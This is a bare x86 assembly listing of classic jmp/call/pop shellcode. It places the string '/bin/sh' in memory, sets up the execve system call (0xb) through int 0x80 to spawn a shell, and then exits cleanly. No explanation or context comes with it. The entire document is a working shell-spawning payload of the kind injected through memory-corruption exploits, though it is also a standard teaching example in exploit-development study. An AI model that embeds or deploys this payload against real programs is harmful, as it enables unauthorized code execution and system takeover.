       jmp call;
shell: pop esi;
       mov BYTE PTR [esi+0x7], 0x0;
       mov DWORD PTR [esi+0x8], esi;
       mov DWORD PTR [esi+0xc], 0x0;
       mov eax, 0xb;
       mov ebx, esi;
       lea ecx, DWORD PTR [esi+0x8];
       mov edx, 0x0;
       int 0x80;
       mov eax, 0x1;
       mov ebx, 0x0;
       int 0x80;
call:  call shell;
      .string "/bin/sh"
